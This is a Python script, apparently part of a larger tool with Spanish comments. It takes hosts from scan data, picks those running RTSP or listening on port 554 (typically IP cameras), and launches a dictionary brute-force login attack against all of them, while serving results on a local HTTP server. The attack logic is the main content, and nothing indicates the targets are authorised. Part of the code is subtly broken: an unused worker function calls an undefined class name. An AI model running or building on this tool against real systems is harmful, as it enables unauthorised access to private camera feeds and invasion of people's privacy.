import os
import json
import time
from http.server import SimpleHTTPRequestHandler, HTTPServer
import threading
from queue import Queue

from rtspBrute import RTSPBruteModule
from common import cargar_datos, guardar_datos, eliminar_duplicados, buscar_palabra, actualizar_datos, extraer_texto_desde_imagen

class NoCacheHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        try:
            super().do_GET()
        except ConnectionAbortedError:
            print("Se ha producido una conexión abortada por el cliente.")

    def end_headers(self):
        self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
        super().end_headers()

def start_http_server():
    port = 8080
    server_address = ('', port)
    httpd = HTTPServer(server_address, NoCacheHandler)
    print(f'Servidor iniciado en http://127.0.0.1:{port}')

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("Servidor detenido.")
        httpd.server_close()

def brute_force_worker(q, dictionary_file):
    while True:
        target = q.get()
        if target is None:
            break
        ip, port = target
        brute = RtspBrute(targets=[(ip, port)], dictionary_file=dictionary_file)
        brute.run()
        q.task_done()

if __name__ == '__main__':
    # Iniciar el hilo para actualizar datos
    threading.Thread(target=actualizar_datos, daemon=True).start()

    # Iniciar el servidor HTTP en un hilo separado
    server_thread = threading.Thread(target=start_http_server)
    server_thread.start()

    # Cargar los datos
    data = cargar_datos()

    # Filtrar las entradas para obtener solo las que usan el puerto 554
    targets = [(entry['IP'], entry['Puerto']) for entry in data if 'RTSP' in entry['Banner'] or entry['Puerto'] == 554]

    # Crear e iniciar el objeto RTSPBruteModule con todas las direcciones IP filtradas
    brute = RTSPBruteModule()
    brute.setup(targets=targets, dictionary_file="diccionario.txt")
    brute.run()

    # Esperar a que el hilo del servidor HTTP termine antes de cerrar el programa principal
    server_thread.join()
